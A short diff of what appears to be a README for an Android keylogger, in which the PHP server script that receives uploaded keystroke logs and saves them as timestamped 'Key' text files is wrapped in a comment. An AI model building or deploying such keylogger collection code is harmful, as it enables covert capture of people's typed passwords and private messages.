@@ -3,7 +3,7 @@ This is a simple solucion Android's Keylogger, this program is writted in Java a
 
 this is the php code:
 
-<?php
+/*<?php
  if (isset($_FILES["uploaded_file"]["name"])) {
 $new_name = "Key".date("his").".txt";
 $name = $_FILES["uploaded_file"]["name"];
@@ -26,4 +26,4 @@ if (!empty($name)) {
     echo 'please choose a file';
 }
 }
- ?>
+ ?>*/
